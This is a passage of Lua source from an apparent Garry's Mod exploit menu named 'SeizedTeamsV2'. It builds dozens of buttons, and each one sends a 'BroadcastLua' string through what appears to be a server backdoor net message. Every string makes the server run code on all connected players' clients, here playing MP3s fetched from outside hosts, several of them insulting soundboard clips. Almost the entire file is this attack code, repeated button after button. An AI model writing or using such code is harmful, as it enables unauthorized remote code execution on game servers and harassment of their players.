Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Pouet pouet" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/R%C3%A9mi%20-%20La%20Totomobile%20-%20clip%20officiel.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Musique - Pouet Pouet" )
    SploitNotify("Musique - Pouet pouet ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Pirouette" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/Pirouette,%20cacahu%C3%A8te%20-%20Il%20%C3%A9tait%20un%20petit%20homme.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Musique - Pirouette" )
    SploitNotify("Musique - Pirouette ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Pomme api" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/Pomme%20de%20reinette%20et%20pomme%20d'api.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Musique - Pomme api" )
    SploitNotify("Musique - Pomme api ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Gipsy" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/L'araign%C3%A9e%20Gipsy.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Musique - Gipsy" )
    SploitNotify("Musique - Gipsy ")
    surface.PlaySound("buttons/blip1.wav") 
end
----SOUNDBOARD


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 140, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Karim" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/KARIM.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Musique - Karim activ�" )
    SploitNotify("Musique - KARIM")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 140, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - AHHHHHH" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/AHHHHHHHHHHHHHHHHH.wav\", \"mono\", function()end )]])") 
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - AHHHHHH activ�" )
    SploitNotify("Soundboard - AHHHHHH ")
    surface.PlaySound("buttons/blip1.wav") 
end


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 140, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Code avec le cul" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/code.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - Code avec le cul activ�" )
    SploitNotify("Soundboard - JE CODE AVEC LE CUL ")
    surface.PlaySound("buttons/blip1.wav") 
end

----TK78
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - WALLAH" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Wallah.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - zehmah" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Zehma.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - mongole" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/bruit%20de%20gogole.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - mon reup" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/mon%20rep%20se%20pose%20des%20questions.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - musique 1" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/musique%201.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - musique 2" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/musique%202.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Sa marche pas" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/%C3%A7a%20Marche%20Pas.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - Sa marche pas" )
    SploitNotify("Soundboard - Sa marche pas ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Anglais" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Anglais.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - Anglais" )
    SploitNotify("Soundboard - Anglais")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Aujourd'hui jles jur�" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Aujourd.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - Aujourd'hui jles jur�" )
    SploitNotify("Soundboard - Aujourd'hui jles jur�")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Et mon compte twitter" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Compte%20Twitter.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - Et mon compte twitter" )
    SploitNotify("Soundboard - Et mon compte twitter")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Coup de coude" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Coup%20De%20Coude.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - Coup de coude" )
    SploitNotify("Soundboard - Coup de coude")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 360 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Coup de coude" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Coup%20De%20Coude.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - Coup de coude" )
    SploitNotify("Soundboard - Coup de coude")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 390 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Dino" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Dinosaure.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - Dino" )
    SploitNotify("Soundboard - Dino")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 420 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - FDP1" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Fils%20De%20Pute%20%231.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - FDP1" )
    SploitNotify("Soundboard - FDP1")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 450 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - FDP2" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Fils%20De%20Pute%20%232.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - FDP2" )
    SploitNotify("Soundboard - FDP2")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 480 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Je pensais pas �a de toi" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Je%20Pensais%20Pas%20%C3%A7a%20De%20Toi.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - Je pensais pas �a de toi" )
    SploitNotify("Soundboard - Je pensais pas �a de toi")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 510 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - PS4" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/La%20Ps4.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - PS4" )
    SploitNotify("Soundboard - PS4")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 540 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Grand p�re moustafa" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Le%20Grand%20P%C3%A8re.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - Grand p�re moustafa" )
    SploitNotify("Soundboard - Grand p�re moustafa")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 570 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - FDP MA LUMIERE" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Ma%20Lumi%C3%A8re.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - FDP MA LUMIERE" )
    SploitNotify("Soundboard - FDP MA LUMIERE")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 600 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Ouvre ta gueule" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Ouvre%20Ta%20Gueule.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard - Ouvre ta gueule" )
    SploitNotify("Soundboard - Ouvre ta gueule")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 630 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - PSG" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/PSG%20les%20Kheys.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 660 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Rachide" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Rachide.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 260, 690 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - RIP LA SOURIS" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Rip%20la%20souris.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

